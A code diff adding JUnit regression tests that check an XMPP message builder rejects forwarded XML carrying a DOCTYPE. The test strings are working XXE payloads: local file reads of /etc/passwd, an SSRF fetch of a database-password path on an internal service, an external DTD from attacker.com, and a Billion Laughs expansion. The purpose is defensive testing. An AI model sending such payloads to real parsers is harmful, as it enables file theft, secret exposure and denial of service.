@@ -7,8 +7,10 @@ package com.zextras.carbonio.chats.core.infrastructure.messaging.impl.xmpp;
 import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertNotNull;
 import static org.junit.jupiter.api.Assertions.assertThrows;
+import static org.junit.jupiter.api.Assertions.assertTrue;
 
 import com.zextras.carbonio.chats.core.annotations.UnitTest;
+import com.zextras.carbonio.chats.core.exception.BadRequestException;
 import com.zextras.carbonio.chats.core.exception.ChatsHttpException;
 import com.zextras.carbonio.chats.core.exception.MessageDispatcherException;
 import com.zextras.carbonio.chats.core.infrastructure.messaging.MessageType;
@@ -233,5 +235,123 @@ class XmppMessageBuilderTest {
             .build();
     assertNotNull(result);
     assertEquals(hoped, result);
+  }
+
+  @Test
+  @DisplayName("XXE: Blocks DOCTYPE declaration attack")
+  void xxeBlocksDoctypeDeclaration() {
+    String xxePayload =
+        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><message xmlns='jabber:client'"
+            + " from='attacker' to='victim' type='groupchat'><body>&xxe;</body></message>";
+    BadRequestException exception =
+        assertThrows(
+            BadRequestException.class,
+            () ->
+                XmppMessageBuilder.create("recipient-id", "sender-id")
+                    .messageToForward(xxePayload)
+                    .build());
+    assertTrue(exception.getMessage().contains("Cannot read the message to forward"));
+  }
+
+  @Test
+  @DisplayName("XXE: Blocks external entity with file read")
+  void xxeBlocksExternalEntityFileRead() {
+    String xxePayload =
+        "<!DOCTYPE foo [<!ENTITY file SYSTEM \"file:///etc/hostname\">]><message"
+            + " xmlns='jabber:client' from='attacker' to='victim'"
+            + " type='groupchat'><body>&file;</body></message>";
+    BadRequestException exception =
+        assertThrows(
+            BadRequestException.class,
+            () ->
+                XmppMessageBuilder.create("recipient-id", "sender-id")
+                    .messageToForward(xxePayload)
+                    .build());
+    assertTrue(exception.getMessage().contains("Cannot read the message to forward"));
+  }
+
+  @Test
+  @DisplayName("XXE: Blocks parameter entity SSRF attack")
+  void xxeBlocksParameterEntitySsrf() {
+    String xxePayload =
+        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM"
+            + " \"http://internal-service:8500/v1/kv/carbonio-ws-collaboration-db/db-password\">"
+            + " %xxe;]><message xmlns='jabber:client' from='attacker' to='victim'"
+            + " type='groupchat'><body>test</body></message>";
+    BadRequestException exception =
+        assertThrows(
+            BadRequestException.class,
+            () ->
+                XmppMessageBuilder.create("recipient-id", "sender-id")
+                    .messageToForward(xxePayload)
+                    .build());
+    assertTrue(exception.getMessage().contains("Cannot read the message to forward"));
+  }
+
+  @Test
+  @DisplayName("XXE: Blocks external DTD loading")
+  void xxeBlocksExternalDtd() {
+    String xxePayload =
+        "<!DOCTYPE foo SYSTEM \"http://attacker.com/malicious.dtd\"><message xmlns='jabber:client'"
+            + " from='attacker' to='victim' type='groupchat'><body>test</body></message>";
+    BadRequestException exception =
+        assertThrows(
+            BadRequestException.class,
+            () ->
+                XmppMessageBuilder.create("recipient-id", "sender-id")
+                    .messageToForward(xxePayload)
+                    .build());
+    assertTrue(exception.getMessage().contains("Cannot read the message to forward"));
+  }
+
+  @Test
+  @DisplayName("XXE: Blocks DOCTYPE with internal entity definition")
+  void xxeBlocksInternalEntityDefinition() {
+    // Valid, well-formed XML with a DOCTYPE that defines only an internal entity (no external
+    // reference). Must be blocked because disallow-doctype-decl=true rejects all DOCTYPE
+    // declarations, preventing entity expansion attacks even without external resources.
+    String xxePayload =
+        "<!DOCTYPE message [<!ENTITY greeting \"Hello\">]><message xmlns='jabber:client'"
+            + " from='attacker' to='victim' type='groupchat'><body>&greeting;</body></message>";
+    BadRequestException exception =
+        assertThrows(
+            BadRequestException.class,
+            () ->
+                XmppMessageBuilder.create("recipient-id", "sender-id")
+                    .messageToForward(xxePayload)
+                    .build());
+    assertTrue(exception.getMessage().contains("Cannot read the message to forward"));
+  }
+
+  @Test
+  @DisplayName("XXE: Blocks Billion Laughs DoS attack")
+  void xxeBlocksBillionLaughsAttack() {
+    String xxePayload =
+        "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;\"><!ENTITY"
+            + " lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;\">]><message xmlns='jabber:client'"
+            + " from='attacker' to='victim' type='groupchat'><body>&lol3;</body></message>";
+    BadRequestException exception =
+        assertThrows(
+            BadRequestException.class,
+            () ->
+                XmppMessageBuilder.create("recipient-id", "sender-id")
+                    .messageToForward(xxePayload)
+                    .build());
+    assertTrue(exception.getMessage().contains("Cannot read the message to forward"));
+  }
+
+  @Test
+  @DisplayName("XXE: Allows legitimate forwarded message without DOCTYPE")
+  void xxeAllowsLegitimateForwardedMessage() {
+    String legitimateMessage =
+        "<message xmlns='jabber:client' from='sender-id' to='recipient-id'"
+            + " type='groupchat'><body>legitimate forwarded content</body></message>";
+    String result =
+        XmppMessageBuilder.create("recipient-id", "sender-id")
+            .messageToForward(legitimateMessage)
+            .messageToForwardSentAt(OffsetDateTime.parse("2023-01-01T00:00:00Z"))
+            .build();
+    assertNotNull(result);
+    assertTrue(result.contains("legitimate forwarded content"));
   }
 }
